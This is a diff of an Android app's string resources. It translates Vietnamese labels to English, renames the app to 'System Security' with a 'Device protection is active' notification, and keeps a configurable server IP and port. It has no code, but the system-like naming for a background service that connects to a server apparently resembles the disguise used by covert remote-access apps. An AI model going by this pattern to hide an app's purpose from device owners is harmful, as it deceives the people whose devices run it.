@@ -1,10 +1,10 @@
 <resources>
-    <string name="app_name">Dịch vụ Hệ thống</string>
-    <string name="service_channel_name">Kênh Dịch vụ Hệ thống</string>
-    <string name="service_notification_title">Dịch vụ Hệ thống</string>
-    <string name="service_notification_active">Đang chạy ngầm để bảo vệ thiết bị</string>
+    <string name="app_name">System Security</string>
+    <string name="service_channel_name">System Security Service</string>
+    <string name="service_notification_title">System Security</string>
+    <string name="service_notification_active">Device protection is active</string>
     
-    <!-- Cấu hình Server - Người dùng CẦN THAY ĐỔI cái này -->
+    <!-- Server Configuration -->
     <string name="server_ip">192.168.1.2</string> 
     <string name="server_port">42474</string>
 </resources>
